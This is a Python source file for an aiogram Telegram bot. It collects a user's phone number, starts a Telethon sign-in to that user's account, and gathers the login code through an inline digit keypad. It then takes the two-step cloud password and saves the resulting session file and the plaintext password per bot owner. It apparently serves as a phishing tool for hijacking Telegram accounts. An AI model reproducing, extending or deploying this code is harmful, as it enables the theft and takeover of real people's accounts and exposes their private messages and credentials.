import re
import time

from aiogram import Router, F
from aiogram.types import (
    Message,
    CallbackQuery,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

from telethon.errors import (
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
)

from .session_service import get_session_path

from .telethon_service import TelethonService
from .redis_lock import RedisLock, build_lock_key
from .rate_limiter import can_request
from .db import upsert_session, get_session
from .text_engine import render_text


# ================= STATES =================

class AuthState(StatesGroup):
    phone = State()
    code = State()
    password = State()


MAX_CODE_ATTEMPTS = 3
MAX_PASSWORD_ATTEMPTS = 3
CODE_LENGTH = 5

telethon_service = TelethonService()


# ================= SAFE SEND =================

async def safe_answer(message: Message, text: str, **kwargs):
    try:
        await message.answer(text, parse_mode="HTML", **kwargs)
    except:
        await message.answer(text, **kwargs)


async def safe_edit(message: Message, text: str, **kwargs):
    try:
        await message.edit_text(text, parse_mode="HTML", **kwargs)
    except:
        await message.edit_text(text, **kwargs)


# ================= KEYPAD =================

def build_pad():
    rows = [[1,2,3],[4,5,6],[7,8,9]]

    keyboard = [
        [InlineKeyboardButton(text=str(n), callback_data=f"pad_{n}") for n in row]
        for row in rows
    ]

    keyboard.append([
        InlineKeyboardButton(text="⌫", callback_data="pad_del"),
        InlineKeyboardButton(text="0", callback_data="pad_0"),
        InlineKeyboardButton(text="✔", callback_data="pad_ok"),
    ])

    return InlineKeyboardMarkup(inline_keyboard=keyboard)


# ================= ROUTER =================

def create_router(texts, bot_id, owner_id):

    router = Router()
    phone_regex = re.compile(r"^\+?\d{9,15}$")

    def t(key, message):
        raw = texts.get(key, key)
        return render_text(raw, {
            "username": message.from_user.username or "",
            "first_name": message.from_user.first_name or "",
        })

    # ================= START =================

    @router.message(F.text == "/start")
    async def start_handler(message: Message, state: FSMContext):

        existing = await get_session(bot_id=bot_id, user_id=message.from_user.id)
        if existing:
            await safe_answer(message, t("already_signed", message))
            return

        kb = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(
                text=texts.get("contact_button", "📱 Telefon"),
                request_contact=True
            )]],
            resize_keyboard=True,
        )

        await state.clear()
        await state.set_state(AuthState.phone)
        await safe_answer(message, t("start", message), reply_markup=kb)

    # ================= PHONE =================

    @router.message(F.contact)
    async def contact_handler(message: Message, state: FSMContext):
        await process_phone(message, state, message.contact.phone_number)

    @router.message(AuthState.phone, F.text)
    async def phone_text_handler(message: Message, state: FSMContext):
        phone = message.text.strip()
        if not phone_regex.match(phone):
            await safe_answer(message, t("invalid_phone", message))
            return
        await process_phone(message, state, phone)

    async def process_phone(message: Message, state: FSMContext, phone: str):

        user_id = message.from_user.id

        existing = await get_session(bot_id=bot_id, user_id=user_id)
        if existing:
            await safe_answer(message, t("already_signed", message))
            return

        if not can_request(user_id):
            await safe_answer(message, t("cooldown", message))
            return

        lock = RedisLock(build_lock_key(owner_id, bot_id, user_id), timeout=40)

        if not await lock.acquire():
            await safe_answer(message, t("progress_alert", message))
            return

        try:
            code_hash = await telethon_service.start_auth(
                owner_id, bot_id, user_id, phone
            )

            await state.set_state(AuthState.code)
            await state.update_data(
                auth_user_id=user_id,
                phone=phone,
                code_hash=code_hash,
                attempts=0,
                pad=""
            )

            await safe_answer(message, t("code_request", message))
            await safe_answer(message, "• • • • •", reply_markup=build_pad())

        except Exception:
            await telethon_service.destroy_failed_session(owner_id, bot_id, user_id)
            await safe_answer(message, t("unknown_error", message))

        finally:
            await lock.release()

    # ================= KEYPAD =================

    @router.callback_query(F.data.startswith("pad_"))
    async def pad_handler(callback: CallbackQuery, state: FSMContext):

        await callback.answer()

        if await state.get_state() != AuthState.code.state:
            return

        data = await state.get_data()
        current = data.get("pad", "")
        action = callback.data.split("_")[1]

        if action.isdigit() and len(current) < CODE_LENGTH:
            current += action

        elif action == "del":
            current = current[:-1]

        elif action == "ok":
            if len(current) == CODE_LENGTH:
                await handle_code(callback.message, state, current)
                return

        masked = "*" * len(current)
        masked = masked.ljust(CODE_LENGTH, "•")

        await state.update_data(pad=current)
        await safe_edit(callback.message, masked, reply_markup=build_pad())

    # ================= CODE PROCESS =================

    async def handle_code(message: Message, state: FSMContext, code: str):

        data = await state.get_data()
        user_id = data["auth_user_id"]   # 🔥 DOIM FSM dan ol


        lock = RedisLock(build_lock_key(owner_id, bot_id, user_id), timeout=40)

        if not await lock.acquire():
            await safe_answer(message, t("progress_alert", message))
            return

        try:
            await telethon_service.sign_in(
                owner_id,
                bot_id,
                user_id,
                data["phone"],
                code,
                data["code_hash"]
            )

            real_path = get_session_path(owner_id, bot_id, user_id) + ".session"
            
            await upsert_session(
                bot_id=bot_id,
                user_id=user_id,
                path=real_path,
                phone=data["phone"],
                cloud_password=None,
            )

            await state.clear()
            await safe_answer(message, t("success", message))

        except PhoneCodeInvalidError:
            attempts = data.get("attempts", 0) + 1
            await state.update_data(attempts=attempts, pad="")

            if attempts >= MAX_CODE_ATTEMPTS:
                await state.clear()
                await telethon_service.destroy_failed_session(owner_id, bot_id, user_id)
                await safe_answer(message, t("code_too_many_attempts", message))
            else:
                await safe_answer(message, t("code_invalid", message))
                await safe_answer(message, "• • • • •", reply_markup=build_pad())

        except PhoneCodeExpiredError:
            await telethon_service.destroy_failed_session(owner_id, bot_id, user_id)
            await state.clear()
            await safe_answer(message, t("code_expired", message))

        except SessionPasswordNeededError:
            await state.set_state(AuthState.password)
            await state.update_data(password_attempts=0)
            await safe_answer(message, t("password_request", message))

        except Exception:
            await telethon_service.destroy_failed_session(owner_id, bot_id, user_id)
            await state.clear()
            await safe_answer(message, t("unknown_error", message))

        finally:
            await lock.release()

    # ================= PASSWORD =================

    @router.message(AuthState.password)
    async def password_handler(message: Message, state: FSMContext):

        data = await state.get_data()
        user_id = data["auth_user_id"]   # 🔥 DOIM FSM dan ol


        lock = RedisLock(build_lock_key(owner_id, bot_id, user_id), timeout=40)

        if not await lock.acquire():
            await safe_answer(message, t("progress_alert", message))
            return

        try:
            await telethon_service.sign_in_password(
                owner_id, bot_id, user_id, message.text.strip()
            )
            real_path = get_session_path(owner_id, bot_id, user_id) + ".session"
            await upsert_session(
                bot_id=bot_id,
                user_id=user_id,
                path=real_path,
                phone=data["phone"],
                cloud_password=message.text.strip()
            )

            await state.clear()
            await safe_answer(message, t("success", message))

        except PasswordHashInvalidError:
            attempts = data.get("password_attempts", 0) + 1
            await state.update_data(password_attempts=attempts)

            if attempts >= MAX_PASSWORD_ATTEMPTS:
                await state.clear()
                await telethon_service.destroy_failed_session(owner_id, bot_id, user_id)
                await safe_answer(message, t("password_too_many_attempts", message))
            else:
                await safe_answer(message, t("password_invalid", message))

        except Exception:
            await telethon_service.destroy_failed_session(owner_id, bot_id, user_id)
            await state.clear()
            await safe_answer(message, t("unknown_error", message))

        finally:
            await lock.release()

    return router
